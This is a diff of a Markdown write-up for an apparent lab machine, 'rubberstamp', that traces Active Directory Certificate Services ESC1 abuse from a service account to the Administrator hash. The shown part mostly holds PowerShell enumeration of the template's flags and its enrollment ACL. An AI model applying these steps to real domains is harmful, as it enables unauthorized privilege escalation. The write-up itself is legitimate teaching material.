@@ -2,7 +2,9 @@
 # Youtube video walk through: https://youtu.be/d7N3ouYnJQY
 
 rubberstamp\svc-iisweb
+
 The path to root was not a local Windows privilege escalation. It was:
+```
 svc-iisweb
   -> AD enumeration
   -> ADCS discovery
@@ -11,7 +13,7 @@ svc-iisweb
   -> PKINIT
   -> Administrator NT hash
   -> read root.txt
-  
+```
 ## 1. Baseline: who am I, where am I?
 
 whoami
@@ -190,7 +192,7 @@ Conclusion
 
 The CA exists and PrivClientAuth is available. Now inspect the template itself.
 
-## 7. Template analysis — this is where ESC1 shows up
+## 5. Template analysis — this is where ESC1 shows up
 
 Query the template object in AD:
 ```
@@ -204,7 +206,7 @@ Get-ADObject `
 Where-Object Name -eq 'PrivClientAuth' |
 Format-List Name,msPKI-Certificate-Name-Flag,msPKI-Enrollment-Flag,msPKI-RA-Signature,pKIExtendedKeyUsage
 ```
-
+```
 Expected output:
 Name                        : PrivClientAuth
 msPKI-Certificate-Name-Flag : 1
@@ -220,13 +222,14 @@ msPKI-Enrollment-Flag = 9
 0x8 = CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS
 It does not contain:
 0x2 = CT_FLAG_PEND_ALL_REQUESTS
+```
 
 So there is no manager approval / pending-request requirement.
 
 msPKI-RA-Signature = 0
 
 No registration authority signature is required.
-
+```
 EKUs
 1.3.6.1.5.5.7.3.2      Client Authentication
 1.3.6.1.5.5.7.3.4      Secure Email
@@ -234,6 +237,7 @@ EKUs
 Client Authentication is the one that makes the certificate usable for PKINIT.
 Enrollment permissions
 Inspect the template ACL:
+```
 ```
 $t = Get-ADObject `
   -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$((Get-ADRootDSE).configurationNamingContext)" `
@@ -248,6 +252,7 @@ Where-Object {
 Select IdentityReference,AccessControlType,ActiveDirectoryRights
 ```
 The relevant enroll extended right is:
+
 0e10c968-78fb-11d2-90d4-00c04f79dc55
 
 We saw Domain Users allowed to enroll.
